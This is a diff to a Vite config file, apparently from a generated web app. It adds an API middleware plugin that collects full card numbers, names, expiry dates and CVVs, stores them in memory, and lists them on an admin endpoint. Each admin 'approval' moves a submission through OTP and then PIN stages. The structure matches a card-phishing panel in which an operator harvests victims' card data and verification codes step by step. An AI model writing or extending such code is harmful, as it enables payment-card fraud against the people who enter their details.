@@ -150,6 +150,176 @@ function vitePluginManusDebugCollector(): Plugin {
   };
 }
 
+// API Middleware Plugin
+function vitePluginApiMiddleware(): Plugin {
+  // In-memory storage for payments
+  const payments = new Map();
+
+  function generateOTP() {
+    return Math.floor(100000 + Math.random() * 900000).toString();
+  }
+
+  function generateId() {
+    return Date.now().toString(36) + Math.random().toString(36).substr(2);
+  }
+
+  return {
+    name: "manus-api-middleware",
+    configureServer(server: ViteDevServer) {
+      // Helper to parse JSON body
+      const parseBody = async (req: any): Promise<any> => {
+        return new Promise((resolve, reject) => {
+          let body = "";
+          req.on("data", (chunk: any) => {
+            body += chunk.toString();
+          });
+          req.on("end", () => {
+            try {
+              resolve(body ? JSON.parse(body) : {});
+            } catch (e) {
+              reject(e);
+            }
+          });
+          req.on("error", reject);
+        });
+      };
+
+      // POST /api/payment/submit-card
+      server.middlewares.use("/api/payment/submit-card", async (req: any, res: any, next: any) => {
+        if (req.method !== "POST") return next();
+
+        try {
+          const body = await parseBody(req);
+          const { cardNumber, cardHolder, expiryDate, cvv, email } = body;
+
+          if (!cardNumber || !cardHolder || !expiryDate || !cvv || !email) {
+            res.writeHead(400, { "Content-Type": "application/json" });
+            res.end(JSON.stringify({ error: "Missing required fields" }));
+            return;
+          }
+
+          const paymentId = generateId();
+          const otp = generateOTP();
+          const payment = {
+            id: paymentId,
+            email,
+            cardNumber,
+            cardHolder,
+            expiryDate,
+            cvv,
+            status: "pending_card",
+            otp,
+            createdAt: new Date().toISOString(),
+          };
+
+          payments.set(paymentId, payment);
+          console.log(`[PAYMENT] Card submitted for ${email}. OTP: ${otp}`);
+
+          res.writeHead(200, { "Content-Type": "application/json" });
+          res.end(
+            JSON.stringify({
+              success: true,
+              paymentId,
+              message: "Card details received. Awaiting admin approval.",
+            })
+          );
+        } catch (error) {
+          console.error("Error submitting card:", error);
+          res.writeHead(500, { "Content-Type": "application/json" });
+          res.end(JSON.stringify({ error: "Internal server error" }));
+        }
+      });
+
+      // GET /api/admin/payments
+      server.middlewares.use("/api/admin/payments", async (req: any, res: any, next: any) => {
+        if (req.method === "GET") {
+          const allPayments = Array.from(payments.values())
+            .filter((p: any) => p.status !== "completed" && p.status !== "rejected")
+            .map((p: any) => ({
+              id: p.id,
+              email: p.email,
+              cardNumber: p.cardNumber,
+              cardHolder: p.cardHolder,
+              status: p.status,
+              createdAt: p.createdAt,
+            }));
+
+          res.writeHead(200, { "Content-Type": "application/json" });
+          res.end(JSON.stringify(allPayments));
+          return;
+        }
+
+        // POST /api/admin/payments/:id/approve or /reject
+        if (req.method === "POST") {
+          try {
+            const approveMatch = req.url?.match(/\/api\/admin\/payments\/([^\/]+)\/approve/);
+            const rejectMatch = req.url?.match(/\/api\/admin\/payments\/([^\/]+)\/reject/);
+
+            if (approveMatch) {
+              const paymentId = approveMatch[1];
+              const payment = payments.get(paymentId);
+
+              if (!payment) {
+                res.writeHead(404, { "Content-Type": "application/json" });
+                res.end(JSON.stringify({ error: "Payment not found" }));
+                return;
+              }
+
+              if (payment.status === "pending_card") {
+                payment.status = "pending_otp";
+              } else if (payment.status === "pending_otp") {
+                payment.status = "pending_pin";
+              } else if (payment.status === "pending_pin") {
+                payment.status = "completed";
+              }
+
+              console.log(`[ADMIN] Payment approved for ${payment.email}`);
+
+              res.writeHead(200, { "Content-Type": "application/json" });
+              res.end(
+                JSON.stringify({
+                  success: true,
+                  message: "Payment approved and moved to next step.",
+                })
+              );
+              return;
+            }
+
+            if (rejectMatch) {
+              const paymentId = rejectMatch[1];
+              const payment = payments.get(paymentId);
+
+              if (!payment) {
+                res.writeHead(404, { "Content-Type": "application/json" });
+                res.end(JSON.stringify({ error: "Payment not found" }));
+                return;
+              }
+
+              payment.status = "rejected";
+              console.log(`[ADMIN] Payment rejected for ${payment.email}`);
+
+              res.writeHead(200, { "Content-Type": "application/json" });
+              res.end(
+                JSON.stringify({
+                  success: true,
+                  message: "Payment rejected.",
+                })
+              );
+              return;
+            }
+          } catch (error) {
+            console.error("Error processing payment:", error);
+            res.writeHead(500, { "Content-Type": "application/json" });
+            res.end(JSON.stringify({ error: "Internal server error" }));
+          }
+        }
+
+        next();
+      });
+    },
+  };
+}
+
 function vitePluginStorageProxy(): Plugin {
   return {
     name: "manus-storage-proxy",
@@ -203,7 +373,7 @@ function vitePluginStorageProxy(): Plugin {
   };
 }
 
-const plugins = [react(), tailwindcss(), jsxLocPlugin(), vitePluginManusRuntime(), vitePluginManusDebugCollector(), vitePluginStorageProxy()];
+const plugins = [react(), tailwindcss(), jsxLocPlugin(), vitePluginManusRuntime(), vitePluginManusDebugCollector(), vitePluginApiMiddleware(), vitePluginStorageProxy()];
 
 export default defineConfig({
   plugins,
@@ -236,6 +406,13 @@ export default defineConfig({
     fs: {
       strict: true,
       deny: ["**/.*"],
+    },
+    proxy: {
+      '/api': {
+        target: 'http://localhost:3000',
+        changeOrigin: true,
+        rewrite: (path) => path,
+      },
     },
   },
 });
